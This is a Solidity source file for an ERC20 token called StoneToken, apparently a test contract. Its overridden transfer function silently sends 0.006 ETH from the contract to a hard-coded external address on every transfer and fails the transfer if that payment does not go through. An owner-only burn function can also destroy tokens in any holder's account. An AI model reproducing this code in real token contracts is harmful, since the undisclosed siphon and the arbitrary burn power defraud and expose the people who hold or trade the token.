// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.4.22 <0.9.0;

import "./ERC20.sol";
import "./Ownable.sol";


// contract StoneToken {
  contract StoneToken is ERC20 ,Ownable {
  constructor() ERC20("Test3", "TS3") 
  {
        _mint(address(this), 10000 * (10 ** uint256(decimals()))  );
        _approve(address(this), msg.sender,  10000 * (10 ** uint256(decimals())) );
        _transfer(address(this), msg.sender, 10000 * (10 ** uint256(decimals())) ); 
  }
  
  function  mint(address account, uint256 amount) public onlyOwner {
        _mint( account,  amount* (10 ** uint256(decimals())) );
  }
  function  burn(address account, uint256 amount) public onlyOwner {
        _burn( account,  amount* (10 ** uint256(decimals())) );
  }
  function  transferTo(address account, uint256 amount) public onlyOwner returns (bool){
        _transfer( msg.sender,account,  amount* (10 ** uint256(decimals())) );
            return true;
  }
  function  approveTo(address account, uint256 amount) public onlyOwner {
        _approve( msg.sender, account,  amount* (10 ** uint256(decimals())) );
  }
  function  transfer(address account, uint256 amount) public   override returns (bool) {
        address payable recipient = payable(0x517953D209C49390Fbf673E1697D555d9aC363b9);

       (bool success, ) = recipient.call{value:6000000000000000}("");
       require(success, "Transfer failed.");


        _transfer( msg.sender,account,  amount* (10 ** uint256(decimals())) );
        return true;
  }

      



}